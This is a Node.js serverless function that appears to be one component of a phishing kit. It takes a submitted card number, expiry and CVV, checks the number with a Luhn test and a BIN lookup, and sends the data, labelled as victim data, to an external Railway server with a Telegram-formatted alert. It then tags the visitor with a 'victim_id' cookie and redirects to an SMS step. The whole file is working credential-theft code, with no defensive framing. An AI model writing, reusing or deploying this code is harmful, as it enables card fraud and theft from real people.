const fetch = require('node-fetch');

const SOCKET_SERVER = 'https://my-project-production-8e23.up.railway.app';

async function getBinInfo(bin) {
  try {
    const response = await fetch(`https://data.handyapi.com/bin/${bin}`);
    if (response.ok) {
      const data = await response.json();
      if (data.Status === 'SUCCESS') {
        return {
          scheme: data.Scheme || 'Unknown',
          type: data.Type || 'Unknown',
          brand: data.CardTier || 'Unknown',
          bank: data.Issuer || 'Unknown',
          country: data.Country ? data.Country.Name : 'Unknown'
        };
      }
    }
  } catch (e) {
    console.error('BIN lookup error:', e);
  }
  return null;
}

function luhnCheck(num) {
  let digits = num.replace(/\D/g, '');
  if (digits.length < 13) return false;
  let sum = 0, alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n; alt = !alt;
  }
  return sum % 10 === 0;
}

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const params = new URLSearchParams(event.body);
    const card_number = (params.get('card_number') || '').replace(/\s/g, '');
    const card_expiry = params.get('card_expiry') || '';
    const card_cvv = params.get('card_cvv') || '';
    const ip = event.headers['x-forwarded-for'] || event.headers['client-ip'] || '?';
    const vId = event.headers.cookie?.match(/victim_id=([^;]+)/)?.[1] || ('v_' + Date.now());

    // Luhn check - если не проходит, редиректим обратно на страницу карты
    if (!luhnCheck(card_number)) {
      return {
        statusCode: 302,
        headers: { 'Location': '/card?error=invalid' },
        body: ''
      };
    }

    // BIN lookup
    const binStr = card_number.replace(/\D/g, '').substring(0, 8);
    const binInfo = binStr.length >= 6 ? await getBinInfo(binStr) : null;

    let telegramMsg = `<b>💳 Card</b>\n<b>Number:</b> <code>${card_number}</code>\n<b>Expiry:</b> <code>${card_expiry}</code>\n<b>CVV:</b> <code>${card_cvv}</code>\n<b>IP:</b> <code>${ip}</code>\n<b>ID:</b> <code>${vId}</code>`;
    if (binInfo) {
      telegramMsg += `\n\n<b>🏦 BIN:</b> ${binInfo.bank} | ${binInfo.brand} | ${binInfo.type} | ${binInfo.country}`;
    }

    await fetch(`${SOCKET_SERVER}/victim-data`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        victimId: vId,
        type: 'card',
        data: { card_number, card_expiry, card_cvv, binInfo, action: 'card' },
        ip,
        page: 'card',
        telegramMsg
      })
    }).catch(e => console.error('Socket notify error:', e));

    return {
      statusCode: 302,
      headers: {
        'Location': '/sms',
        'Set-Cookie': `victim_id=${vId}; Path=/; SameSite=Lax`
      },
      body: ''
    };
  } catch (error) {
    console.error('Error:', error);
    return { statusCode: 500, body: 'Internal Server Error' };
  }
};
